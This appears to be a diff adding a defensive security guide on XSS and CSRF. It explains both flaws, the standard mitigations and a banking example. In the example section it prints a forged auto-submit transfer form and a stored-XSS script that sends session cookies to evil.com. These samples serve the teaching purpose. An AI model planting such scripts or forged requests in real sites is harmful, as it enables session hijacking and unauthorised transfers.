@@ -1,0 +1,53 @@
+Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) are distinct but often co-occurring web application vulnerabilities. XSS exploits the trust a user has in a site to execute malicious scripts in the user’s browser. CSRF exploits the trust a site has in a user’s browser to forge authenticated requests. Effective protection requires understanding their mechanisms and implementing layered, defense-in-depth controls.
+
+**Definition**
+
+XSS occurs when an application includes untrusted data in a web page without proper validation or escaping. An attacker injects client-side scripts (typically JavaScript) that execute in the context of another user’s session. The three primary types are:
+- **Reflected XSS**: The injected script is part of the request (e.g., URL parameter) and is immediately reflected in the response.
+- **Stored XSS**: The injected script is permanently stored on the server (e.g., in a database) and served to users without sanitization.
+- **DOM-based XSS**: The vulnerability exists entirely in client-side JavaScript, where untrusted data modifies the DOM environment.
+
+CSRF forces an authenticated user to execute unwanted actions on a web application in which they are currently authenticated. An attacker crafts a malicious link, form, or script that, when visited by the victim, triggers a state-changing request (e.g., transfer funds, change email) using the victim’s existing session cookies. The server cannot distinguish the forged request from a legitimate one because the session cookie is automatically included.
+
+**Key Components**
+
+**XSS Protection**
+- **Output Encoding**: Encode all user-controlled data before rendering in HTML, JavaScript, CSS, or URL contexts. Use context-specific encoding functions (e.g., HTML entity encoding for HTML body, JavaScript string encoding for script blocks). Frameworks like React and Angular auto-encode by default, but raw innerHTML assignments bypass this.
+- **Input Validation**: Validate input on the server side against a strict whitelist of allowed characters, types, and lengths. Reject or sanitize input that does not match. Never rely solely on client-side validation.
+- **Content Security Policy (CSP)**: Implement a strict CSP header (e.g., `Content-Security-Policy: default-src 'self'; script-src 'self'`) to restrict which scripts can execute. Use nonces or hashes for inline scripts. CSP is a powerful mitigation but not a replacement for output encoding.
+- **HttpOnly and Secure Cookies**: Mark session cookies as `HttpOnly` to prevent JavaScript access, and `Secure` to ensure transmission only over HTTPS. This limits the impact of XSS on session hijacking but does not prevent all XSS attacks.
+- **Context-Aware Sanitization**: For rich content (e.g., HTML from a WYSIWYG editor), use a server-side HTML sanitizer library (e.g., DOMPurify on the client, OWASP Java HTML Sanitizer on the server) that strips dangerous tags and attributes.
+
+**CSRF Protection**
+- **Synchronizer Token Pattern (CSRF Tokens)**: Embed a unique, unpredictable token in each form or state-changing request. The server validates the token on submission. Tokens must be tied to the user session and be cryptographically random. Do not expose tokens in GET requests.
+- **SameSite Cookies**: Set the `SameSite` attribute on session cookies to `Strict` or `Lax`. `Strict` prevents the cookie from being sent with any cross-site request. `Lax` allows top-level navigations (e.g., clicking a link) but blocks POST forms from external sites. This is a strong defense but may break legitimate cross-site flows.
+- **Custom Request Headers**: For AJAX/API endpoints, require a custom header (e.g., `X-Requested-With: XMLHttpRequest`). Browsers enforce the same-origin policy for custom headers, preventing cross-origin requests from setting them. This works well for single-page applications.
+- **Double Submit Cookie**: Send a random value in both a cookie and a request header. The server verifies they match. This avoids server-side token storage but is weaker than synchronizer tokens if an attacker can set cookies (e.g., via subdomain takeover).
+- **Origin/Referer Header Validation**: Check the `Origin` or `Referer` header on state-changing requests. Reject requests from unexpected origins. This is a secondary check, as headers can be spoofed in some scenarios.
+
+**Real-World Application**
+
+Consider a banking application with a money transfer endpoint `POST /transfer`. Without CSRF protection, an attacker can host a page with `<form action="https://bank.com/transfer" method="POST"><input name="amount" value="1000"><input name="to" value="attacker"></form>` and auto-submit it. The victim’s session cookie is sent, and the transfer executes.
+
+To protect this endpoint:
+1. Generate a CSRF token on the server and embed it in the form: `<input type="hidden" name="csrf_token" value="random_token">`. Validate this token on the server.
+2. Set the session cookie with `SameSite=Lax` to block cross-site POST submissions.
+3. Add a custom header `X-CSRF-Token` to all AJAX requests and validate it server-side.
+
+For XSS, consider a comment field that renders user input. Without encoding, an attacker submits `<script>new Image().src='https://evil.com/steal?cookie='+document.cookie</script>`. Every user viewing the comment executes the script, sending their session cookie to the attacker.
+
+To protect:
+1. Encode the comment output in the HTML body context: replace `<` with `&lt;`, `>` with `&gt;`, etc.
+2. Apply a CSP that blocks inline scripts: `script-src 'self'`. This prevents the injected script from executing even if encoding fails.
+3. Set the session cookie with `HttpOnly` so the script cannot access `document.cookie`.
+
+**Security Relevance**
+
+XSS and CSRF are consistently ranked in the OWASP Top 10. XSS can lead to session hijacking, credential theft, defacement, and malware delivery. CSRF can cause unauthorized fund transfers, data modification, or account takeover. The two vulnerabilities often compound: an XSS flaw can be used to bypass CSRF protections (e.g., by reading the CSRF token from the DOM and forging a request). Therefore, a robust security posture requires addressing both independently and in combination.
+
+Modern frameworks provide built-in protections (e.g., Angular’s anti-XSS, Rails’ CSRF tokens), but misconfiguration or bypasses are common. Engineers must verify that protections are correctly implemented at every layer: input, output, transport, and storage. Regular penetration testing and automated scanning for both XSS and CSRF are essential.
+
+**Key Takeaways**
+- XSS is prevented by context-aware output encoding, strict CSP, and input validation; never trust user data in any rendering context.
+- CSRF is prevented by synchronizer tokens, SameSite cookies, and custom request headers; never rely solely on cookie-based authentication for state-changing requests.
+- XSS can defeat CSRF protections, so both must be hardened together; treat them as complementary, not alternative, controls.
